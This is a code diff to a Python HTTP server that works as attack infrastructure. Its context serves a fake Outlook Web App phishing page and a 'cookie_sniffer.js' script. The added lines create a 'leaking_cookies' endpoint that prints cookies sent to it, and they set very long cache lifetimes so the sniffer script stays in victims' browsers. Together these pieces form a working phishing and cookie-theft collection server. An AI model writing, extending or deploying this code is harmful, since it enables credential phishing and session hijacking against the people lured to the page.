@@ -268,9 +268,25 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       self.wfile.write(open('OutlookWebApp.html','r').read())
       logphishing()
 
+    elif path.endswith('leaking_cookies'):
+      self.send_response(200)
+      self.send_header('Content-Type','text/html')
+      self.send_header('Cache-Control','public, max-age=99936000')
+      self.send_header('Expires','Sat, 01 Jul 2055 03:42:00 GMT')
+      self.send_header('Last-Modified','Tue, 15 Nov 1994 12:30:00 GMT')
+      self.end_headers()
+      faked = False
+
+      if 'cookies' in self.headers:
+        print self.headers['cookies']
+
     else:
 
       self.send_response(200)
+      self.send_header('Content-Type','text/html')
+      self.send_header('Cache-Control','public, max-age=99936000')
+      self.send_header('Expires','Sat, 01 Jul 2055 03:42:00 GMT')
+      self.send_header('Last-Modified','Tue, 15 Nov 1994 12:30:00 GMT')
       self.end_headers()
 
       self.wfile.write(open('js/cookie_sniffer.js').read())
